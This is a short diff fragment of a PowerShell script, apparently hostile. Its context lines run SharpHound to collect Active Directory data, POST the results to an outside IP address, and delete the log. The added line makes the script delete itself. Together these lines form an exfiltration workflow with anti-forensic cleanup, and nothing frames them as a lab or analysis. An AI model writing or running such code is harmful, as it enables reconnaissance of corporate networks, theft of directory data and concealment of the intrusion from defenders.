@@ -41,3 +41,4 @@ $sharphoundOutput = Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDi
 $sharphoundOutput | Out-File -FilePath "log.txt" -Encoding UTF8
 Invoke-WebRequest -Uri "http://18.134.172.169/29622395-3621-4094-996b-1fd1ca730297.php" -Method POST -ContentType 'text/plain' -InFile "log.txt"
 Remove-Item -Path "log.txt"
+Remove-Item -Path "script.ps1"
